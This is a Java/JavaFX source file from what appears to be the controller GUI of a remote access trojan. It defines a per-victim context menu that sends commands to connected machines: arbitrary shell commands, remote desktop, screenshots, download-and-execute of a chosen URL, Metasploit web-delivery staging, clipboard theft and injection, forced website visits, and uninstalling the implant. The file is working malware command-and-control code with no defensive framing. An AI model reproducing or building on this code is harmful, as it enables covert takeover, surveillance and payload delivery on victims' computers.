package GUI.Components;

import GUI.Controller;
import GUI.Views.*;
import Logger.Level;
import Logger.Logger;
import Server.ClientObject;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import javafx.scene.Scene;
import javafx.scene.control.ContextMenu;
import javafx.scene.control.Menu;
import javafx.scene.control.MenuItem;
import javafx.scene.control.TableCell;
import javafx.scene.input.Clipboard;
import javafx.scene.input.ClipboardContent;
import javafx.scene.input.MouseEvent;
import javafx.stage.Stage;
import javafx.stage.StageStyle;

import java.io.IOException;

class IPContextMenu implements Repository {
    static void getIPContextMenu(TableCell n, MouseEvent e) {
        ClientObject clientObject = ((ClientObject) n.getTableView().getSelectionModel().getSelectedItem());
        ContextMenu cm = new ContextMenu();
        Menu mi1 = new Menu("Perform Action...");
        MenuItem sb1 = new MenuItem("File Explorer");
        sb1.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("FILELIST");
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        });
        MenuItem sb2 = new MenuItem("Send Command");
        sb2.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new SendCommandView().getSendCommandView(stage), 400, 400));
            stage.show();
            SendCommandView.getsendCommandButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        clientObject.clientCommunicate("CMD " + SendCommandView.getTextField().getText());
                    } catch (IOException e1) {
                        e1.printStackTrace();
                    }
                }
            });
        });
        MenuItem sb3 = new MenuItem("Remote Desktop");
        sb3.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new RemoteDesktopView().getRemoteDesktopView(clientObject, stage), 400, 400));
            stage.show();
        });

        MenuItem si4 = new MenuItem("Take Screenshot");
        si4.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("SCREENSHOT");
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        });

        MenuItem si5 = new MenuItem("Download & Execute");
        si5.setOnAction(event -> {

            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new DownloadAndExecuteView().getDownloadAndExecuteView(stage), 400, 200));
            stage.show();
            DownloadAndExecuteView.getDownloadButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        // TODO put in url regex check
                        String url = DownloadAndExecuteView.getUrlFieldValue();
                        Logger.log(Level.INFO, "Sending DaE for: " + url);
                        clientObject.clientCommunicate("DAE " + url);
                        //clientObject.clientCommunicate("CMD " + SendCommandView.getTextField().getText());
                    } catch (IOException e1) {
                        e1.printStackTrace();
                    }
                }
            });
        });

        MenuItem si6 = new MenuItem("System Info");
        si6.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinHeight(300);
            stage.setScene(new Scene(new SysInfoView().getSysInfoView(stage), 400, 300));
            stage.show();
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("SYINFO");
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        });

        MenuItem si7 = new MenuItem("MSF Web Delivery");
        si7.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinHeight(300);
            stage.setScene(new Scene(new WebDeliveryView().getWebDeliveryView(stage), 400, 300));
            stage.show();
            WebDeliveryView.getTargetsComboBox().getSelectionModel().selectFirst();
            WebDeliveryView.getExecuteButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        String target = WebDeliveryView.getTargetsComboBox().getSelectionModel().getSelectedItem().toString().toLowerCase();
                        clientObject.clientCommunicate("MSFWD " + target + " " + WebDeliveryView.getUrl().getText());
                        stage.close();
                    } catch (IOException e1) {
                        e1.printStackTrace();
                    }
                }
            });
        });

        // Clipboard junk
        Menu clip = new Menu("Clipboard Functions");
        MenuItem setClipboard = new MenuItem("Set Clipboard");
        setClipboard.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(150);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new SetClipboardView().getSetClipboardView(stage), 300, 225));
            stage.show();
            SetClipboardView.getSetClipboardButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        clientObject.clientCommunicate("CLIPSET " + SetClipboardView.getTextField().getText().trim());
                        stage.close();
                    } catch (IOException e1) {

                    }
                }
            });
        });

        MenuItem getClipboard = new MenuItem("Get Clipboard Data");
        getClipboard.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new GetClipboardView().getGetClipboardView(stage), 400, 400));
            stage.show();
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("CLIPGET");
                } catch (IOException e1) {

                }
            }
        });
        clip.getItems().addAll(setClipboard, getClipboard);


        //////// MISC \\\\\\\\
        Menu misc = new Menu("Misc.");
        MenuItem visit = new MenuItem("Visit Website");
        visit.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(100);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new VisitWebsiteView().getVisitWebsiteView(stage), 400, 200));
            stage.show();
            VisitWebsiteView.getGoButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        clientObject.clientCommunicate("VISIT " + VisitWebsiteView.getUrl().getText().trim());
                        stage.close();
                    } catch (IOException e1) {

                    }
                }
            });
        });
        MenuItem showMsgbox = new MenuItem("Show Messagebox");
        showMsgbox.setOnAction(event -> {
            Stage stage = new Stage();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinHeight(100);
            stage.setMinWidth(300);
            stage.setScene(new Scene(new ShowMessageboxView().getShowMessageboxView(stage), 400, 200));
            stage.show();
            ShowMessageboxView.getGoButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    try {
                        clientObject.clientCommunicate("MSGBOX " + ShowMessageboxView.getMsg().getText().trim());
                        stage.close();
                    } catch (IOException e1) {

                    }
                }
            });
        });
        misc.getItems().addAll(visit, showMsgbox);

        mi1.getItems().addAll(sb1, sb2, sb3, si4, si5, si6, si7, clip, misc);
        MenuItem mi2 = new MenuItem("Copy IP");
        mi2.setOnAction(event -> {
            final Clipboard clipboard = Clipboard.getSystemClipboard();
            final ClipboardContent content = new ClipboardContent();
            content.putString(n.getText());
            clipboard.setContent(content);
        });
        MenuItem mi3 = new MenuItem("Uninstall Server");
        mi3.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                try {
                    clientObject.clientCommunicate("EXIT");
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
            assert clientObject != null;
            PseudoBase.getKumoData().remove(clientObject.getIP());
            CONNECTIONS.remove(clientObject.getIP());
            Controller.updateStats();
            Controller.updateTable();
        });



        cm.getItems().addAll(mi1, mi2, mi3);
        cm.show(n, e.getScreenX(), e.getScreenY());
    }
}
